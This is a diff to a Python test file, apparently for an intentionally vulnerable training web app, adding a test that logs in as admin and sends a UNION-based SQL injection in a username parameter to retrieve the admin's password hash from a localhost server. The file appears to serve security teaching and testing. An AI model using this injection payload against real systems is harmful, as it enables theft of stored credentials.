@@ -45,9 +45,15 @@ def test_act4_content():
 
 
 def test_act5_classic_sql_injection():
-    pass
-    # TODO
-    # Vulnerable to classic SQL
+    # Logs into the account successfully
+    session = requests.session()
+    credentials = {'username': 'admin', 'password': 'admin'}
+    login = session.post("http://localhost:5000/login", data=credentials)
+    assert login.status_code == 200 and "Welcome" in login.text
+
+    injection = session.get("http://localhost:5000/getcount?username=admin' "
+                       "UNION SELECT HashedPass FROM users where Username='admin'--'")
+    assert injection.status_code == 200 and "sha256" in injection.text
 
 
 def test_act5_blind_sql_injection():
